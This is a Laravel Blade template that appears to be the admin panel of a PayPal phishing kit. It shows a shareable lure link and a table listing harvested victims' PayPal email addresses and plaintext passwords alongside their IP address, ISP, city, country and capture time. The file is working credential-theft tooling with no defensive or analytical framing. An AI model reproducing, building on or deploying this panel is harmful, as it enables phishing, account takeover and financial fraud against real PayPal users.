@extends('layouts.dashboard')

@section('content')

<div class="row">
    <div class="col-md-12">
        
        <div class="">{{ __('Paypal') }}
            <p><strong>Share this link: </strong><a href="{{ route('cnlcny') }}" target="_blank" rel="noopener noreferrer">{{ __('Paypal') }}</a></p>
        </div>
            
        <table class="table table-bordered table-striped table-hover">
            <thead>
                <tr>
                    <th>email</th>
                    <th>password</th>
                    <th>ip</th>
                    <th>isp</th>
                    <th>city</th>
                    <th>country</th>
                    <th>time</th>
                </tr>
            </thead>
            <tbody>
                @foreach ($dataPaypal as $dataP)
                <tr>
                    <td>{{ $dataP->login_email }}</td>
                    <td>{{ $dataP->login_password }}</td>
                    <td>{{ $dataP->ip }}</td>
                    <td>{{ $dataP->isp }}</td>
                    <td>{{ $dataP->city }}</td>
                    <td>{{ $dataP->country }}</td>
                    <td>{{ $dataP->created_at }}</td>
                </tr>
                @endforeach
            </tbody>
        </table>                
        
    </div>
</div>

@endsection
